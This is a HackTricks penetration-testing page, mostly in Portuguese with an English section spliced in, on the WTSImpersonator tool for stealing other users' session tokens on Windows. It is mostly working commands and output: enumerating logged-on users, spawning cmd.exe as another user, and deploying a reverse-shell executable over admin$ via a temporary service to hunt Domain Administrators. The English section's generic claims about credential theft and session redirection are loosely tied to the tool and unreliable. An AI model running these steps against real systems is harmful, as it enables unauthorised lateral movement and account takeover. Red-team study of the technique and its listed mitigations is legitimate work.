<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

O WTS Impersonator abusa do Named pipe RPC "**\\pipe\LSM_API_service**" para enumerar usuários logados e roubar tokens de outros usuários sem usar a técnica normal de "Impersonação de Token", isso permite um movimento lateral fácil e discreto, essa técnica foi pesquisada e desenvolvida por [Omri Baso](https://www.linkedin.com/in/omri-baso/).

A ferramenta `WTSImpersonator` pode ser encontrada no [github](https://github.com/OmriBaso/WTSImpersonator).
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### Módulo `enum`:

Enumerar Usuários Locais na máquina em que a ferramenta está sendo executada
```powershell
.\WTSImpersonator.exe -m enum
```
Enumerar uma máquina remotamente fornecendo um IP ou um nome de host.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### Módulo `exec` / `exec-remote`:
Tanto o "exec" quanto o "exec-remote" requerem estar em um contexto de **"Serviço"**.
O módulo local "exec" não precisa de nada além do WTSImpersonator.exe e do binário que você deseja executar (sinalizador -c), isso poderia ser
um "C:\\Windows\\System32\\cmd.exe" normal e você abrirá um CMD como o usuário desejado, um exemplo seria
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
Você pode usar o PsExec64.exe para obter um contexto de serviço.
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
Para `exec-remote`, as coisas são um pouco diferentes. Eu criei um serviço que pode ser instalado remotamente, assim como o `PsExec.exe`. O serviço receberá um `SessionId` e um `binário para executar` como argumento, e será instalado e executado remotamente, desde que as permissões corretas sejam fornecidas. Um exemplo de execução seria o seguinte:
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
Como pode ser visto acima, o `Sessionid` da conta de Administrador é `2`, então o utilizamos em seguida na variável `id` ao executar o código remotamente.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### Módulo `user-hunter`:

O módulo user hunter permitirá que você enumere várias máquinas e, se um determinado usuário for encontrado, executará código em nome desse usuário.
Isso é útil ao procurar por "Administradores de Domínio" enquanto se tem direitos de administrador local em algumas máquinas.
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session. This technique takes advantage of the fact that WTS sessions can be redirected to a remote server.

## How it works

1. The attacker gains access to a target system that has a WTS session active.
2. The attacker identifies the active WTS session and determines the session ID.
3. The attacker uses the `WTSQueryUserToken` function to obtain the user token associated with the active session.
4. The attacker duplicates the user token using the `DuplicateTokenEx` function.
5. The attacker creates a new process using the duplicated token, effectively impersonating the user.
6. The attacker can now perform actions on behalf of the user, including stealing credentials.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, consider the following measures:

- Regularly monitor and audit WTS sessions to detect any unauthorized activity.
- Implement strong access controls and authentication mechanisms to prevent unauthorized access to WTS sessions.
- Use multi-factor authentication to add an extra layer of security to user credentials.
- Keep systems and applications up to date with the latest security patches to prevent exploitation of known vulnerabilities.
- Educate users about the risks of phishing attacks and the importance of not sharing their credentials with anyone.

By implementing these measures, you can significantly reduce the risk of WTS Impersonator attacks and protect user credentials from being stolen.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

